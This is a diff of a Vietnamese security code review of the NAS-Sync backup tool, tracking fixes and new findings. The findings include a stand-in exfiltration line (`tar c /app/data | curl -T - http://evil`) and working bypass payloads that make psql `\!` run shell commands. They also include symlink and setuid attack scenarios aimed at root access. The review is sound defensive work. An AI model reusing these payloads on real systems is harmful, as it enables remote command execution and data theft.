@@ -1,65 +1,121 @@
-# Code Review lần 2 — nhánh `wnreview`
+# Code Review lần 3 — nhánh `wnreview`
 
-Re-review NAS-Sync từ `89de7ca` (merge PR #2, v1.2.0) đến `81dbf5b` (`main`, v1.5.6): 14 commit,
-114 file, khoảng +26.700 / −3.300 dòng. Review này chỉ đọc code, không sửa code dự án.
+Re-review NAS-Sync từ `81dbf5b` (v1.5.6, mốc của review lần 2) đến `75563a8` (`main`, v1.7.0):
+3 commit (v1.6.0, fix CI, v1.7.0), 105 file, khoảng +10.200 / −2.700 dòng.
+Review này chỉ đọc code, không sửa code dự án.
 
 ## Đánh giá chung
 
-Lớp xác thực và phân quyền đã tiến bộ rõ so với lần trước:
+v1.6.0 xử lý gần như toàn bộ danh sách của review lần 2, và đa số bản sửa đúng hướng:
 
-- Có `token_version` nên logout hay đổi mật khẩu sẽ vô hiệu các phiên cũ.
-- Có kiểm tra `Origin` để chống CSRF và có 2FA TOTP.
-- RBAC (ADMIN / OPERATOR / VIEWER) được kiểm tra ở 2 lớp và mặc định từ chối (fail-closed).
-- Secret được mask khi trả về client.
-- TOFU host key có khóa server khi key thay đổi.
-- Retention đã có lock theo server.
-- Đã có 19 test tự động chạy trong CI.
+- **MySQL:** đã dùng `--binary-mode` (thêm `--sandbox` nếu client hỗ trợ), nên đường RCE qua
+  `\!` vào NAS đã bị chặn.
+- **Rsync:** chạy trong cùng một phiên `cd -P` + kiểm tra `pwd -P`.
+- **Config rewriter:** chạy dưới user của site, dùng `mktemp` + `mv`.
+- **Hủy job:** dùng process group (`kill(-pid)`) thay cho pipeline `bash -c`.
+- **Claim job:** nguyên tử bằng `UPDATE … WHERE status IN (…)`; restore không còn bị retry.
+- **Updater:** mặc định chỉ cài release đã ký Ed25519.
+- **Offsite:** prefix Google Drive được lọc chính xác, part S3 tính theo dung lượng, NASSYNC2 có
+  header nằm trong AAD.
+- **Auth:** TOTP chống replay, khóa 2FA tách khỏi `JWT_SECRET`, Socket.IO kiểm tra lại
+  `token_version`.
+- **Khác:** đã có ESLint và 29 test.
 
-Kết quả: 4 agent review không tìm thấy lỗi Nghiêm trọng/Cao nào trong phần auth/API.
+Không còn mục **Nghiêm trọng** nào. Còn lại 5 mục **Cao**:
 
-**Rủi ro lớn nhất còn lại nằm ở ranh giới "dữ liệu từ VPS/khách hosting → lệnh chạy bằng root".**
+1. **S12:** bộ lọc `sql-stream-guard` cho PostgreSQL bị bypass được. Khi psql ở VPS đích không có
+   `\restrict`, dump độc vẫn chạy được `\!` dưới user `postgres`.
+2. **S13:** đặt `--binary-mode` *trước* `--defaults-extra-file` làm **mọi restore MySQL** hỏng
+   trên cPanel và trên HestiaCP/CyberPanel/CloudPanel khi dùng `.my.cnf`. Đây là regression do
+   chính bản sửa S1 gây ra.
+3. **N18:** ở chế độ BullMQ, lần retry cuối không chuyển job sang FAILED và không gửi cảnh báo
+   (N4 cũ mới sửa cho Local mode).
+4. **U6, U7:** chữ ký release chỉ an toàn bằng mức bảo vệ của pipeline CI. Push một tag `v*` bất
+   kỳ là được ký tự động, và job build vẫn chạy script cài đặt của dependency trước khi đóng gói.
 
-- **Nghiêm trọng:** file dump SQL lấy từ VPS được pipe thẳng vào client `mariadb`/`mysql`/`psql`
-  mà không có `--binary-mode`. Một VPS bị chiếm có thể chạy lệnh bằng root trên NAS, nơi giữ SSH
-  key của mọi VPS khác.
-- **Cao:** có 2 lỗi TOCTOU/symlink cho phép khách hosting ghi đè file bất kỳ bằng quyền root trên
-  VPS: config rewriter và khoảng hở giữa kiểm tra jail và lúc chạy rsync.
+Ngoài ra có vài lỗi chức năng mới: `find . -P` của aaPanel sai cú pháp nên `chmod` không bao
+giờ chạy (S9), và bundle release có sẵn `.env` nên bước setup của `install.sh` bị bỏ qua (U11).
 
-Mảng thứ hai cần ưu tiên là **độ tin cậy của hàng đợi**:
+## Trạng thái các mục của review lần 2
 
-- Job đã COMPLETED/FAILED vẫn có thể bị chạy lại. Restore thất bại bị BullMQ retry tới 10 lần, mỗi
-  lần chạy `rsync --delete` vào site production.
-- Lệnh hủy không giết được pipeline `bash -c`.
-- Job hết lượt retry nằm im ở INTERRUPTED mà không có cảnh báo nào.
+### Bảo mật: shell, SSH, dữ liệu từ VPS
 
-Self-update vẫn thường xuyên rơi về nhánh `main` HEAD và không được xác thực.
+| Mục | Trạng thái | Bằng chứng | Ghi chú |
+|---|---|---|---|
+| S1 | ⚠️ Sửa một phần | `sandbox-verifier.ts:65-73, 147-156`, `restore-worker.ts:175`, `postgres-streamer.ts:247-251, 402-418` | MySQL đã đóng. PostgreSQL chỉ an toàn khi psql đích có `\restrict`; nếu không có, chỉ còn bộ lọc tự viết, mà bộ lọc này bypass được (**S12**). Thứ tự cờ ở restore làm hỏng MySQL restore (**S13**). |
+| S2 | ✅ Đã sửa (còn sót nhỏ) | `config-rewriter.ts:50-70, 92-127` | Đã hạ quyền sang user site, dùng `mktemp` + `mv -f`, chặn symlink theo từng đoạn path. Khi user site là root hoặc không tồn tại, script vẫn fallback chạy `sh -c` bằng root (dòng 66-67), và `mv` không có `-T`. |
+| S3 | ⚠️ Sửa một phần | `base.ts:69-86`, `rsync-runner.ts:173-176`, `restore-worker.ts:95-98`, `extended-hosting-backup.ts:159-162` | Race ở thư mục gốc đã đóng. Rsync phía remote vẫn chạy root trong cây thư mục khách ghi được: nếu khách đổi thư mục con thành symlink sau khi rsync dựng xong file list, rsync vẫn đọc hoặc ghi ra ngoài cây. Đề xuất chạy rsync bằng user site chưa được làm (*cần xác nhận theo phiên bản rsync*). |
+| S4 | ✅ Đã sửa | `ssh.ts:486-519`, `709-732`, `773-789` | Key quét được phải là tập con của key đã pin; key mới chuyển sang MISMATCH. Đã bỏ `+ssh-rsa`. |
+| S5 | ✅ Đã sửa | `base.ts:201-252` | Jail CyberPanel đã gắn với home của user site. |
+| S6 | ⚠️ Sửa một phần, bypass được | `postgres-streamer.ts:233-244, 263-265, 405-407`, `sql-stream-guard.ts:37-41` | Chỉ `SET SESSION AUTHORIZATION` khi role tồn tại và không phải superuser. Kết nối vẫn được xác thực bằng `postgres`, nên dump đổi ngược lại được: guard cho qua `SET session_authorization = postgres;` và `set_config('session_authorization', …)`. Sau đó `DO $$ … COPY … TO PROGRAM $$` cũng lọt, vì guard không kiểm tra nội dung bên trong dollar-quote (*phía guard đã xác nhận, phía PostgreSQL cần xác nhận*). |
+| S7 | ✅ Đã sửa | `ssh.ts:701-706, 765-770` | Không còn fallback `accept-new` + `/dev/null`. |
+| S8 | ✅ Đã sửa | `ssh.ts:165-202` | Socket ControlMaster nằm trong `DATA_DIR/.ssh_mux`, có kiểm tra symlink, owner và mode. |
+| S9 | ❌ **Bản sửa bị lỗi** | `aapanel.ts:185-191` | `find . -P …` sai cú pháp (`-P` phải đứng trước path). GNU find báo `unknown predicate '-P'` và thoát với mã 1, nên `chmod` không bao giờ chạy trên aaPanel. `restore-worker.ts:661-664` chỉ log một warning. Sửa: `find -P . ! -type l …`. Test `sh -n` không bắt được lỗi này. |
+| S10 | ✅ Đã sửa (còn sót) | `worm-snapshot.ts:29, 35-40, 73, 342` | TLS đã được kiểm tra mặc định. Nhưng vẫn chấp nhận URL `http://`, nên mật khẩu admin NAS và bearer key TrueNAS có thể đi dạng plaintext. |
+| S11 | ✅ Đã sửa | `directadmin.ts:24-45`, `cpanel.ts:24-47`, `cyberpanel.ts:24-56`, `hestiacp.ts:30-60` | Chỉ username được gửi về NAS; mật khẩu được đọc ngay trên VPS. |
+| N13 | ✅ Đã sửa | `volume-manager.ts:249-264` | Tạo symlink tạm rồi `renameSync`, có báo lỗi. |
 
-## Trạng thái các mục còn mở từ review lần 1
+### Bảo mật: updater, release, offsite
 
-| Mục cũ | Trạng thái | Bằng chứng |
-|---|---|---|
-| Retention xóa snapshot đang được restore | ✅ Đã sửa | Lock theo server ở `queue.ts:193-231`, route retention thủ công cũng lấy lock (`schedules/retention/route.ts:62`), bỏ qua snapshot mà restore QUEUED/RUNNING đang dùng (`retention-gfs.ts:39-88`). Còn hở nhỏ: explorer download/archive và `verify_sandbox` không lấy lock. |
-| Self-update tải HEAD `main`, không checksum; `force` bỏ qua job đang chạy | ⚠️ Sửa một phần | `force` không còn bỏ qua kiểm tra job (`system/update/route.ts:36-42`, `updater.ts:886-889`). Đã có prebuilt + SHA-256, nhưng vẫn fallback về `main` HEAD mà không xác thực (xem **U1**, **U2**). |
-| `GET /api/settings` trả secret dạng plaintext | ✅ Đã sửa | Mask `••••••••` và không ghi đè khi lưu lại giá trị mask (`settings/route.ts:18-30, 98, 181-187`). |
-| DSM password đi qua query string GET | ✅ Đã sửa | Đã chuyển sang `POST` (`btrfs-worm.ts:43`). |
-| Logout không vô hiệu JWT, đổi mật khẩu không kick phiên khác | ✅ Đã sửa | Tăng `token_version` khi logout, đổi mật khẩu, đổi role, reset 2FA; kiểm tra ở `server.ts:236` và `auth.ts:36-68`. |
-| Không có CSRF | ✅ Đã sửa | `middleware.ts:47-76` kiểm tra `Origin`/`Referer`; Socket.IO kiểm tra ở `server.ts:312-320`. |
-| `accept-new` + `+ssh-rsa`, chưa hiện fingerprint | ⚠️ Phần lớn đã sửa | Có TOFU pin theo server, MISMATCH thì khóa server, UI hiện fingerprint. Vẫn còn `+ssh-rsa`, nhánh fallback `accept-new` + `/dev/null`, và lỗi rescan (**S4**). |
-| `resolveTargetWebroot` (cPanel/DA) nội suy trong `"..."` | ✅ Đã sửa | Dùng `shellSingleQuote` (`cpanel.ts:252-253`, `directadmin.ts:292-293`). |
-| ssh/bash/fetch không có timeout hay cancel | ⚠️ Sửa một phần | Probe zstd 20s, watchdog 30 phút, btrfs 15s, `execRemoteSSH` 60s. Nhưng pipeline `bash -c` vẫn không giết được (**N2**) và sandbox import chưa được đăng ký cancel. |
-| Verify/anomaly ném lỗi sau commit làm `latest` trỏ vào snapshot FAILED | ⚠️ Sửa một phần | `updateLatestSymlink` đã chuyển ra sau verify (`backup-worker.ts:619`). Vẫn còn **N12**. |
-| Retention trộn UTC và giờ local | ✅ Đã sửa | `retention-gfs.ts:19-37, 136, 187, 206`. |
-| Không có test tự động | ✅ Đã sửa | Có `tests/security-and-engine.test.ts` (19 test, chạy trong CI). |
-| Không có ESLint | ❌ Còn mở | Vẫn không có file config ESLint và script `lint`. |
-| `backup-worker.ts` quá dài | ✅ Đã sửa | Tách thành `mysql-streamer`, `postgres-streamer`, `rsync-runner`, `mock-runner`, `worker-state`; còn 777 dòng. |
-| API trả nguyên văn `err.message` | ⚠️ Sửa một phần | Đã có `api-error.ts`, nhưng khoảng 25 handler vẫn trả thô (**A1**). |
-| Dockerfile `npm install` + devDependencies | ⚠️ Sửa một phần | Đã dùng `npm ci`, nhưng vẫn `--include=dev` vì updater fallback cần `next build`. Container vẫn chạy root (không có `USER`). |
+| Mục | Trạng thái | Bằng chứng | Ghi chú |
+|---|---|---|---|
+| U1 | ⚠️ Sửa một phần | `updater.ts:66-68, 1146, 1179-1279`, `release.yml:3-6, 77-107` | Mặc định chỉ cài `releases/latest` có tarball + `.sha256` + `.sig`, và `force` không còn fallback về `main`. Cài từ `main` HEAD chỉ khi đặt `ALLOW_UNVERIFIED_MAIN_UPDATE=true` (biến này compose không truyền vào container). Lỗ còn lại: mọi tag push lên đều được ký (**U6**). |
+| U2 | ✅ Đã sửa cho gói prebuilt | `release-signature.ts:9-11, 35-42, 64-88`, `updater.ts:1237, 1259-1279` | Chữ ký phủ `nas-sync-release-v1\|<tag>\|<sha256>`, được kiểm tra trước khi tải và sau khi tính hash, fail-closed. Public key được nhúng trong code. Bundle dùng cho `install.sh`/`update.sh` vẫn chưa được ký (**U9**). |
+| U3 | ✅ Phần lớn đã sửa | `updater.ts:1574-1612, 1652-1674` | `node_modules` được swap sau bước snapshot, có backup delta và khôi phục trong catch. Còn sót nhỏ ở **U14**. |
+| U4 | ✅ Đã sửa | `updater.ts:245-262`, `offsite-cloud.ts:1590`, `queue.ts:407, 495-503, 636, 967, 1018` | Cron, BullMQ, local queue và offsite đều tôn trọng cờ "đang cập nhật". Row UPLOADING bị kẹt được dọn khi khởi động. |
+| U5 | ✅ Đã sửa | `updater.ts:1327-1336, 1386-1416` | Tải `tar.gz/<sha>` theo đúng SHA đã resolve. |
+| E1 | ⚠️ Đã sửa trong source, chưa tới bản cập nhật qua UI | `docker-entrypoint.sh:7-85` | Đã cài vào thư mục tạm rồi mới swap. Nhưng updater 1-click không bao giờ cập nhật entrypoint (**U8**). |
+| R1 | ⚠️ Sửa một phần | `release.yml:8-56, 58-120, 122-124` | Đã tách job build (read-only, `persist-credentials: false`) khỏi job publish, pin action theo SHA (đã xác minh 9 SHA khớp tag), và `docker-ghcr` có `needs: build`. Job build vẫn chạy `npm ci` có script cài đặt (**U7**). |
+| R2 | ⚠️ Sửa một phần | `update.sh:49-101` | Mặc định theo tag release, giữ nguyên `docker-compose.yml` (bản mới lưu thành `.dist`). Nhưng không kiểm tra chữ ký và có các đường fallback không xác thực (**U9**). |
+| O1 | ✅ Đã sửa | `offsite-cloud.ts:86-110, 834-838, 1406-1414` | Lọc tên file bằng regex chính xác cộng `appProperties.nasSyncHostname`. |
+| O2 | ✅ Đã sửa | `offsite-cloud.ts:116-126, 639-641, 699-705` | Part từ 8 đến 512 MiB, có assert ≤ 10.000 part. |
+| O3 | ✅ Đã sửa | `offsite-cloud.ts:1628-1649` | Bắt buộc COMPLETED và server không có backup đang chạy. |
+| O4 | ✅ Đã sửa | `offsite-cloud.ts:653-655, 756-793, 1651-1681` | Chờ tar thoát mã 0 rồi mới commit, abort multipart khi lỗi, và giới hạn upload song song. |
+| O5 | ⚠️ Sửa một phần | `offsite-cloud.ts:132-261, 534, 558` | Đã chặn IP nội bộ, đặt `redirect: 'error'` và cắt gọn body lỗi. Vẫn còn DNS rebinding (**O7**). |
+| O6 | ✅ Đã sửa | `offsite-cloud.ts:1123-1163, 1236-1256` | Hỏi offset bằng `bytes */*` trước khi gửi lại. |
+| C1 | ✅ Đã sửa | `offsite-crypto.ts:27-65, 178-185, 328-347`, `decrypt-offsite-backup.mjs:318-338` | Header nằm trong AAD, PBKDF2 600k vòng (async) với tham số lưu trong header, EOF được xác thực. Vẫn tương thích ngược NASSYNC1. CLI không nhận passphrase qua argv. Độ dài passphrase tối thiểu vẫn là 8 (`offsite-cloud.ts:1602`). |
+| Dockerfile | ⚠️ Sửa một phần | `Dockerfile:1-11, 73`, `docker-entrypoint.sh:87-133` | Build nhiều stage, runtime không còn devDependencies, và app chạy bằng PUID qua `su-exec`. Entrypoint vẫn chạy root để `npm ci` và `chown -R` mỗi lần boot (**E2**). App vẫn chạy root nếu đặt `RUN_AS_ROOT=true`. |
 
-**Lỗi merge sót:** không có conflict marker hay dòng lặp. Chỉ có vài lỗi vặt:
+### Độ tin cậy: hàng đợi, job, mất dữ liệu
 
-- Dòng trống thừa cuối file ở `alerts/page.tsx`, `api/alerts/route.ts` và `types/index.ts`.
-- Hai nhánh if/else cùng gọi `reloadCronSchedules()` (`settings/route.ts:166-170`).
-- Allowlist có key trùng khác hoa thường `dsm_worm_Enabled` / `dsm_worm_enabled` (`settings/route.ts:53-54`).
+| Mục | Trạng thái | Bằng chứng | Ghi chú |
+|---|---|---|---|
+| N1 | ✅ Phần lớn đã sửa | `queue.ts:313-363, 830-845`, `jobs/[id]/route.ts:177-194` | Claim nguyên tử có kiểm tra `changes === 0`, restore ném `UnrecoverableError`, jobId cố định, chặn retry job COMPLETED/INTERRUPTED. Còn một đường chạy lại (**N19**). |
+| N2 | ✅ Đã sửa | `worker-state.ts:45-73`; spawn detached ở `rsync-runner.ts:180`, `mysql-streamer.ts:46, 120`, `restore-worker.ts:102, 180, 242`, `postgres-streamer.ts:277, 301`, `sandbox-verifier.ts:153, 236`, `archive/route.ts:109` | Đã bỏ pipeline `bash -c`; Node pipe thẳng vào stdin của ssh/mariadb. |
+| N3 | ✅ Đã sửa | `archive/route.ts:138-216` | Có backpressure qua `pause()` / `pull()`; khi abort thì kill cả process group. |
+| N4 | ⚠️ **Chỉ sửa cho Local mode** | `backup-worker.ts:783-808`, `queue.ts:620, 844` | BullMQ mode vẫn hở (**N18**). Digest vẫn chỉ đếm FAILED (`morning-digest.ts:122, 190, 369`). |
+| N5 | ⚠️ Sửa một phần | `restore-worker.ts:263-296`, `postgres-streamer.ts:323-325`, `sandbox-verifier.ts:18-39` | Restore đã tính byte đọc là hoạt động. Timeout sandbox có scale nhưng chặn trần ở 90 phút, và khi timeout hoặc bị hủy vẫn đánh **CORRUPTED** thay vì UNTESTED (`sandbox-verifier.ts:299-315, 909-916, 970`). |
+| N6 | ✅ Đã sửa | `backup-worker.ts:826-829`, `worker-state.ts:211-269` | |
+| N7 | ✅ Đã sửa | `queue.ts:491-569, 677-692` | |
+| N8 | ✅ Đã sửa (còn hở) | `queue.ts:415-436, 640-650` | Nhả lock không drain lại local queue (**N24**). |
+| N9 | ✅ Đã sửa | `notifications.ts:52-67, 460-504` | |
+| N10 | ✅ Đã sửa | `servers/[id]/route.ts:65-80` | Không cho đổi hostname khi server đã có job. Xóa server vẫn để lại dữ liệu mồ côi (**N25**). |
+| N11 | ⚠️ Sửa một phần | `restore-worker.ts:53, 657-660, 809-812` | Timeout nâng lên 15 phút nhưng vẫn là timeout cứng, và không hủy được. |
+| N12 | ✅ Đã sửa | `backup-worker.ts:587-688` | |
+| N14 | ✅ Đã sửa | `queue.ts:191-239, 725-749` | |
+| N15 | ✅ Đã sửa | `servers/route.ts:64-73`, `servers/[id]/route.ts:51-64` | |
+| N16 | ⚠️ Sửa một phần | `server.ts:18-24` | Đã có handler, nhưng `uncaughtException` chỉ log rồi chạy tiếp. Nếu một handler stream ném lỗi đồng bộ trước khi settle (ví dụ `mysql-streamer.ts:167`, `postgres-streamer.ts:92`), promise treo mãi và job kẹt ở RUNNING, giữ cả lock lẫn slot. |
+| N17 | ✅ Phần lớn đã sửa | `explorer.ts:172, 318, 346`, `rsync-runner.ts:17`, `queue.ts:289-307`, `db.ts:349-357` | Diff đã giới hạn 1 MiB nhưng `diffLines` vẫn chạy đồng bộ. WORM batch còn lỗi (**N26**). |
+| Retention vs explorer/verify | ✅ Đã sửa | `snapshot-pins.ts`, `archive/route.ts:101`, `download/route.ts:67`, `retention-gfs.ts:161` | Pin được kiểm tra, rồi `rmSync` chạy đồng bộ ngay sau, không có await xen giữa. |
+
+### Auth, API, RBAC
+
+| Mục | Trạng thái | Bằng chứng | Ghi chú |
+|---|---|---|---|
+| A1 | ✅ Đã sửa (còn sót) | Mọi catch đều dùng `safeErrorJson` / `sanitizeErrorMessage` | Còn route mới `volumes/snapshot/route.ts:11-12` (**A16**). |
+| A2 | ✅ Đã sửa | `server.ts:153, 179`, `alerts/route.ts:21, 115, 131, 152` | |
+| A3 | ✅ Đã sửa | `server.ts:340-392`, `events.ts:40-46, 91-98` | Kiểm tra lại mỗi lần broadcast và mỗi 15s; tiến trình update chỉ gửi cho ADMIN. |
+| A4 | ✅ Đã sửa | `totp.ts:224-294`, `2fa/route.ts:179-196` | |
+| A5 | ⚠️ Sửa một phần | `totp.ts:20-83, 326-331, 417-431`, `login/route.ts:121-126` | Đã có khóa riêng. Nhưng hash recovery code dạng `v1:` vẫn dẫn xuất từ `JWT_SECRET` và không được migrate; secret chỉ được mã hóa lại khi user đăng nhập. |
+| A6 | ✅ Đã sửa | `login/route.ts:26-28, 70-74` | Chạy scrypt giả với username không tồn tại. |
+| A7 | ✅ Đã ghi tài liệu | `README.md:139`, `HUONG-DAN-CAI-DAT-NAS.md:72`, `.env.example:35` | |
+| A8 | ✅ Đã sửa | `schedules/route.ts:10`, `volumes/route.ts:126`, `jobs/[id]/route.ts:81` | |
+| ESLint | ✅ Đã sửa | `eslint.config.mjs`, CI có bước `npm run lint` | |
+| Lỗi merge sót lần 2 | ✅ Đã sửa | `settings/route.ts:196-198` | `reloadCronSchedules` chỉ còn gọi một lần; key `dsm_*` đã đổi thành `worm_*`. |
+
+Bảng RBAC trong `server.ts` khớp với các route. Các route mới (`volumes/snapshot`,
+`servers/[id]/host-key`, `settings/digest`, `audit-logs`) rơi vào mặc định chỉ ADMIN, và route
+nào cũng tự gọi `requireRole(['ADMIN'])`.
 
 ## Phát hiện mới
 
@@ -67,101 +123,119 @@ Self-update vẫn thường xuyên rơi về nhánh `main` HEAD và không đư�
 
 | # | Mức | Vị trí | Kịch bản lỗi | Đề xuất sửa |
 |---|---|---|---|---|
-| S1 | **Nghiêm trọng** | `sandbox-verifier.ts:54-60`, `restore-worker.ts:168-170`, `postgres-streamer.ts:247` | Dump SQL lấy từ VPS được pipe vào `mariadb` / `mysql` / `psql`. Cả repo không có chỗ nào dùng `--binary-mode`, `--sandbox` hay `\restrict`. Ở chế độ batch, các client này vẫn chạy meta-command `\! <lệnh shell>`. Hệ quả: (1) VPS bị chiếm trả về dump có dòng `\! sh -c 'tar c /app/data \| curl -T - http://evil'`, và sandbox verify (bật mặc định sau mỗi backup) chạy nó **bằng root trong container NAS**, nơi giữ SSH key của mọi VPS. (2) Khi restore chéo server, lệnh đó chạy bằng root trên VPS đích. Nếu không cần VPS bị chiếm: khách trên VPS có `mysqldump` cũ (CVE-2024-21096) có thể làm điều tương tự bằng tên bảng chứa xuống dòng (*cần xác nhận*). | Thêm `--binary-mode` (và `--sandbox` nếu client hỗ trợ) cho mọi lệnh import mysql/mariadb. Với PostgreSQL, dùng `\restrict` (PG ≥ 17.6 / 16.10) hoặc `pg_dump -Fc` + `pg_restore`. Chạy sandbox import ở container không có quyền đọc key, cho app chạy user non-root, và restore bằng user DB của khách thay vì root. |
-| S2 | **Cao** | `config-rewriter.ts:138-144` | Script chỉ kiểm tra `$F` và thư mục cha, rồi chạy bằng root `cp -p -- "$F" "$F.nas-sync.bak"` và `cat > "$F.nas-sync.tmp.$$"`. `cp` và `>` đều ghi xuyên qua symlink đã có sẵn ở đích. Kịch bản: khi restore có `autoPatchConfig`, khách tạo trước `wp-config.php.nas-sync.bak -> /root/.ssh/authorized_keys` và đặt public key của mình trong `wp-config.php`. Root sẽ chép file đó vào `authorized_keys`, tức khách có SSH root. Cửa sổ thời gian kéo dài vài phút (restore DB cộng nhiều lượt SSH), nên không cần race chặt. | Tạo file bak/tmp bằng `mktemp` trong `$D_DIR` (O_EXCL), hoặc `rm -f` trước rồi dùng `cp --remove-destination`. Tốt nhất là chạy toàn bộ bước patch dưới user hệ thống của site. |
-| S3 | **Cao** (restore) / Trung bình (backup) | `restore-worker.ts:457 → 470 → 482`, `backup-worker.ts:319 → 365`, `extended-hosting-backup.ts:540-596` | Lệnh kiểm tra jail (`verifyRemoteWebrootSafety`) và lệnh rsync chạy ở hai lượt SSH khác nhau, và rsync dùng path chưa resolve. Giữa hai lượt, khách đổi `public_html` thành symlink tới `/root/.ssh` hoặc `/etc`. Khi đó rsync root `--delete` ghi đè `authorized_keys` hoặc xóa sạch `/etc`. Ở chiều backup, kéo được `/etc/shadow` và `/root/.my.cnf` vào snapshot của khách, rồi lấy ra qua restore hoặc download. | Kiểm tra và chuyển dữ liệu trong cùng một lệnh: `--rsync-path='cd -P -- <real> && [ "$(pwd -P)" = <real> ] && exec rsync'` rồi rsync `.`. Tốt hơn nữa là chạy rsync phía remote bằng `sudo -u <user>`. |
-| S4 | Trung bình | `ssh.ts:431-466` (rescan được gọi từ `ssh.ts:882-893`) | Sau một lần "Host key verification failed", rescan chấp nhận **toàn bộ** block key mới miễn có 1 key khớp với key cũ. MITM chuyển tiếp kết nối keyscan ed25519/ecdsa tới host thật và tự trả lời kết nối rsa bằng key của mình, thế là key RSA của kẻ tấn công được pin là VERIFIED. Vì có `+ssh-rsa`, các lần sau ssh chấp nhận key đó. | Chỉ tự động chấp nhận khi tập key quét được là tập con của key đã lưu; key mới hoặc đổi phải chuyển sang pending và chờ ADMIN duyệt. Bỏ `+ssh-rsa`. |
-| S5 | Trung bình (*cần xác nhận*) | `base.ts:143-155` | Jail của CyberPanel cho phép mọi path `/home/*/*`, không gắn với home của user site. Chủ `a.com` symlink `public_html` sang `/home/victim.com/public_html`: backup sẽ kéo site của nạn nhân vào snapshot của a.com, còn restore a.com sẽ chạy `--delete` vào webroot của nạn nhân. | Bắt `$REAL` phải nằm trong home của `externalApp` (`getent passwd`) hoặc `/home/<domain>/`. |
-| S6 | Trung bình (*cần xác nhận*) | `postgres-streamer.ts:36, 247` | Restore PostgreSQL bằng superuser với `--no-owner --no-privileges`, nên mọi object thành của `postgres`. Hàm `SECURITY DEFINER` của khách (ví dụ `COPY ... TO PROGRAM`) sẽ chạy với quyền superuser, cho khách shell dưới user postgres. Ngoài ra role của khách mất quyền trên các bảng vừa restore, nên site nhiều khả năng bị lỗi. | Restore bằng owner đích (`SET ROLE` / `pg_restore --role`). |
+| S12 | **Cao** | `sql-stream-guard.ts:33, 64, 68-76, 151-152, 171, 223, 287-291, 322-326` | Dump của VPS A bị chiếm được restore sang VPS B có psql thiếu `\restrict` (PG < 17.6 / 16.10 / 15.14 / 14.19 / 13.22), và `\!` chạy shell dưới user `postgres` trên B. Các payload là SQL hợp lệ (nên `ON_ERROR_STOP` không chặn được) mà guard cho qua nguyên vẹn, cả khi đưa cả khối lẫn từng byte một:<br>(1) `SELECT 1 AS "COPY x FROM stdin";` làm guard tưởng đang ở chế độ COPY.<br>(2) `-- x\r\! id`: guard chỉ kết thúc comment ở `\n`, còn psql kết thúc ở cả `\r`.<br>(3) `CREATE TABLE a$$x$ …` khiến guard đọc nhầm thành mở dollar-quote.<br>(4) `SET standard_conforming_strings = off` lọt vì string literal bị thu gọn trước khi chạy regex.<br>(5) `client_encoding = 'SJIS'` có byte `0x5c` nằm trong ký tự multibyte.<br>(6) `a$E'\'`.<br>Ngoài ra `\restrict` có trong dump bị xóa đi (dòng 151-152). Phía guard đã xác nhận bằng cách chạy thật; phía psql suy ra từ `psqlscan.l`, *cần xác nhận với psql thật*. | Không dựa vào lexer tự viết. Từ chối restore PostgreSQL khi đích không có `\restrict`, hoặc chuyển sang `pg_dump -Fc` + `pg_restore`. Kết nối bằng role của khách thay vì `postgres` + `SET SESSION AUTHORIZATION`. Nếu giữ guard: từ chối `\r`, `client_encoding` khác UTF8, mọi nhắc tới `standard_conforming_strings` / `session_authorization`, và không giữ text trong quoted identifier khi so khớp COPY. Bỏ câu "chặn 100%" trong comment. |
+| S13 | **Cao** (regression) | `restore-worker.ts:175`, `base.ts:45-50` | Lệnh là `mysql --binary-mode ${authFlags}`. Khi `authFlags` là `--defaults-extra-file=…`, option này không còn đứng đầu, nên client báo `unknown variable 'defaults-extra-file=…'` và thoát với mã 7 (đã chạy thử với mysql 8.0.30; MariaDB *cần xác nhận*). Hệ quả: **mọi restore MySQL thất bại** trên cPanel và trên HestiaCP/CyberPanel/CloudPanel khi dùng `.my.cnf` / `debian.cnf`. Lỗi theo hướng an toàn nhưng làm mất tính năng restore. Đã tự đọc code để xác nhận. | `mysql ${authFlags} --binary-mode …`. Thêm test kiểm tra thứ tự cờ. |
+| S14 | Trung bình | `restore-worker.ts:72-81`, `rsync-runner.ts:133-144` | Restore push bằng `-az` dưới quyền root, giữ nguyên owner và bit setuid/setgid từ snapshot. Khi NAS chạy root (`RUN_AS_ROOT`, hoặc volume cũ do root sở hữu), VPS nguồn bị chiếm có thể cài binary setuid-root cùng một file PHP kích hoạt vào `public_html`. Sau restore chéo server, binary đó giữ quyền setuid root cho tới khi `chown -hR` chạy (tới 15 phút), hoặc mãi mãi nếu chown lỗi (chỉ log warning), tức là có root trên VPS đích. | Thêm `--no-o --no-g --chmod=ugo-s` khi push và pull, và/hoặc chạy rsync phía remote bằng user site. |
+| S15 | Thấp | `restore-worker.ts:587-603`, `base.ts:69-86` | Fallback root `mkdir -p -- "$TARGET"` đi theo symlink ở các thành phần trung gian của path, nên có thể tạo thư mục rỗng của root ở ngoài jail trước lần kiểm tra thứ hai (*cần xác nhận*). | Bỏ fallback root, hoặc tạo từng đoạn path và kiểm tra symlink ở mỗi đoạn. |
+| S16 | Thấp | `ssh.ts:709-732, 773-789` | Không đặt `GlobalKnownHostsFile=/dev/null`, nên key của IP đó trong `/etc/ssh/ssh_known_hosts` của container cũng được chấp nhận song song với key đã pin (*cần xác nhận*). | Đặt `GlobalKnownHostsFile=/dev/null`. |
+| S17 | Thấp / Trung bình | `worm-snapshot.ts:83, 191-214, 248-267` | Snapshot TrueNAS được tạo với `recursive: true`, nhưng hold chỉ đặt trên ID cha, nên snapshot của dataset con nhiều khả năng không được hold. Cùng một API key vừa nhả hold vừa xóa được snapshot, nên ai chiếm được NAS-Sync là xóa được bản "WORM". Response list trên 2 MB thì bước dọn hết hạn bị bỏ qua mà không báo (*cần xác nhận với API TrueNAS*). | Hold đệ quy. Dùng key chỉ có quyền tạo snapshot và đặt hold, còn việc hết hạn để NAS tự xử lý. |
 
-### Bảo mật: updater, release, offsite
+### Bảo mật: updater, release, cài đặt
 
 | # | Mức | Vị trí | Kịch bản lỗi | Đề xuất sửa |
 |---|---|---|---|---|
-| U1 | **Cao** | `updater.ts:1078-1099, 945, 390-395, 1182-1200` | Updater bỏ gói prebuilt đã kiểm tra SHA-256 mỗi khi `main` HEAD khác commit của release. `force` luôn bỏ qua prebuilt, và `hasUpdate` bật lên sau mỗi lần push lên `main`. Trên thực tế, đường thường gặp là tải `codeload …/refs/heads/main` (không tag, không checksum), chạy `npm install` và `next build` rồi thực thi bằng root. Một lần push độc (hoặc token bị lộ) lan ra mọi NAS bấm "Cập nhật", bỏ qua cả tag lẫn CI. | Chỉ cập nhật theo tag release đã ký. Đưa `main` thành "kênh dev" phải bật thủ công. `force` chỉ cài lại bản release đã xác thực. |
